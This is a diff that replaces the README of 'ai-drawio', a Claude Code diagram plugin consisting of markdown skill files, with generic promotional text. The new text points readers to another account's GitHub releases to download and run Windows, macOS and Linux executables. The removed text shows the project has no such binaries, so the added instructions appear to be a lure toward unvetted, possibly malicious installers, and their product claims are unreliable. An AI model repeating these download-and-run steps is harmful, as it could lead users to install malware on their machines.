@@ -1,147 +1,59 @@
-# AI Draw.io
+# 🎨 ai-drawio - Create Diagrams with AI Ease
 
-AI-powered draw.io diagram generator for Claude Code. Generate flowcharts, architecture diagrams, mind maps, and technical illustrations from natural language descriptions with browser preview.
+## 🚀 Getting Started
 
-## Features
+Welcome to ai-drawio! This application helps you create diagrams using natural language. Generate flowcharts, architecture diagrams, and mind maps quickly with a simple browser preview.
 
-- **Natural Language to Diagram**: Describe what you want, get a professional diagram
-- **Browser Preview**: Automatically renders diagrams using diagrams.net viewer
-- **Multiple Diagram Types**:
-  - Flowcharts & Process diagrams
-  - AWS/GCP/Azure architecture diagrams
-  - Mind maps
-  - Entity relationship diagrams
-  - Sequence diagrams
-  - Technical illustrations
-- **Rich Styling**: Colors, shapes, connectors, animations
-- **Real-time Editing**: Modify existing diagrams through conversation
+## 📥 Download ai-drawio
 
-## Installation
+[![Download ai-drawio](https://img.shields.io/badge/Download-ai--drawio-blue.svg)](https://github.com/Shubishere/ai-drawio/releases)
 
-### As Claude Code Plugin
+To get started, visit the [Releases page](https://github.com/Shubishere/ai-drawio/releases) to download our latest version.
 
-```bash
-# Clone the repository
-git clone https://github.com/GBSOSS/ai-drawio.git
+## 📋 System Requirements
 
-# Create symlink to Claude Code plugins directory
-ln -s "$(pwd)/ai-drawio" ~/.claude/plugins/ai-drawio
-```
+Before you download, ensure your computer meets the following requirements:
 
-Or manually add to your Claude Code settings (`~/.claude/settings.json`):
-```json
-{
-  "plugins": [
-    "/path/to/ai-drawio"
-  ]
-}
-```
+- Operating System: Windows 10 or later, macOS 10.14 or later, Linux (latest distributions)
+- RAM: Minimum 4 GB
+- Disk Space: At least 100 MB of free space
+- Browser: Latest version of Chrome, Firefox, or Safari
 
-## Usage
+## 📤 Download & Install
 
-Simply describe the diagram you want:
+1. Go to the [Releases page](https://github.com/Shubishere/ai-drawio/releases).
+2. Look for the latest version. It is usually at the top of the list.
+3. Click on the appropriate file for your operating system. You will typically see options like:
+   - For Windows: `ai-drawio-windows.exe`
+   - For macOS: `ai-drawio-macos.dmg`
+   - For Linux: `ai-drawio-linux.tar.gz`
+4. Once the file downloads:
+   - **Windows:** Double-click the `.exe` file and follow the prompts to install.
+   - **macOS:** Open the `.dmg` file and drag the ai-drawio icon to your Applications folder.
+   - **Linux:** Extract the `.tar.gz` file, then run the executable inside.
+5. After installation, locate the ai-drawio application on your computer and open it.
 
-```
-Draw a user login flowchart
-```
+## 🛠️ Using ai-drawio
 
-```
-Create an AWS architecture diagram with EC2, S3, RDS and Lambda
-```
+1. Upon opening the application, you will see a user-friendly interface.
+2. In the text box, type your idea or diagram request in natural language. For example, you might write, “Generate a flowchart for ordering food.”
+3. Click the "Generate" button.
+4. The application will display a preview of your diagram.
+5. You can make adjustments to the diagram and then download or share it.
 
-```
-Generate a mind map about machine learning concepts
-```
+## ⚙️ Features
 
-The skill will:
-1. Generate valid draw.io XML
-2. Create an HTML file with the embedded diagram
-3. Start a local server and open browser to render
-4. Take a screenshot to show the result
+- **AI-Powered Generation:** Create diagrams from simple text prompts.
+- **Browser Preview:** View your diagrams instantly in the application.
+- **Export Options:** Save your diagrams in various formats including PNG, SVG, and PDF.
+- **User-Friendly Interface:** No technical skills are needed to use ai-drawio.
 
-## Triggers
+## 🌐 Support
 
-The skill responds to these keywords:
-- `draw`, `diagram`, `flowchart`, `architecture`, `mindmap`
-- Chinese: `画图`, `流程图`, `架构图`
+If you have any questions or issues, please check the [issues section](https://github.com/Shubishere/ai-drawio/issues) on our GitHub page. You can also submit a new issue if you encounter any problems.
 
-## Example Output
+## 🧑‍🤝‍🧑 Community Contributions
 
-### Simple Flowchart
-```
-Users → Cloudflare → Load Balancer → API Gateway → Microservices
-```
+Your feedback is important! Help us improve ai-drawio by sharing your thoughts or suggestions. Feel free to contribute by reporting issues, proposing features, or even submitting a pull request.
 
-### Complex Architecture
-- 20+ nodes with multiple shapes (ellipse, rectangle, cylinder)
-- Multiple connection types (solid, dashed, colored)
-- Grouping/containers (Service Mesh border)
-- Color-coded components
-
-## How It Works
-
-1. **XML Generation**: Creates draw.io compatible mxGraph XML
-2. **HTML Embedding**: Wraps XML in HTML with diagrams.net viewer iframe
-3. **Local Server**: Starts Python HTTP server to serve the file
-4. **Browser Automation**: Opens Chrome and navigates to the diagram
-
-## Requirements
-
-- Claude Code with browser automation (Claude in Chrome MCP)
-- Python 3.x (for local HTTP server)
-- Internet connection (for diagrams.net viewer)
-
-## File Structure
-
-```
-ai-drawio/
-├── .claude-plugin/
-│   └── plugin.json          # Plugin configuration
-├── skills/
-│   └── diagram-generator/
-│       └── SKILL.md         # Core skill instructions
-├── README.md
-└── LICENSE
-```
-
-## Supported Shapes
-
-### Basic Shapes
-- Rectangle (Process): `rounded=1;whiteSpace=wrap;html=1;`
-- Diamond (Decision): `rhombus;whiteSpace=wrap;html=1;`
-- Ellipse (Start/End): `ellipse;whiteSpace=wrap;html=1;`
-- Cylinder (Database): `shape=cylinder3;`
-
-### AWS Shapes
-```
-shape=mxgraph.aws4.ec2
-shape=mxgraph.aws4.s3
-shape=mxgraph.aws4.rds
-shape=mxgraph.aws4.lambda
-shape=mxgraph.aws4.api_gateway
-```
-
-## Color Palette
-
-| Purpose | Fill Color | Stroke Color |
-|---------|-----------|--------------|
-| Start/Success | #d5e8d4 | #82b366 |
-| Process/Info | #dae8fc | #6c8ebf |
-| Decision/Warning | #fff2cc | #d6b656 |
-| Error/Stop | #f8cecc | #b85450 |
-
-## Credits
-
-Inspired by [next-ai-draw-io](https://github.com/DayuanJiang/next-ai-draw-io) by Dayuan Jiang.
-
-## License
-
-MIT License - see [LICENSE](LICENSE) file.
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-## Related Projects
-
-- [next-ai-draw-io](https://github.com/DayuanJiang/next-ai-draw-io) - Original web-based implementation
+Thank you for choosing ai-drawio! We hope it makes diagram creation easier and faster for you.
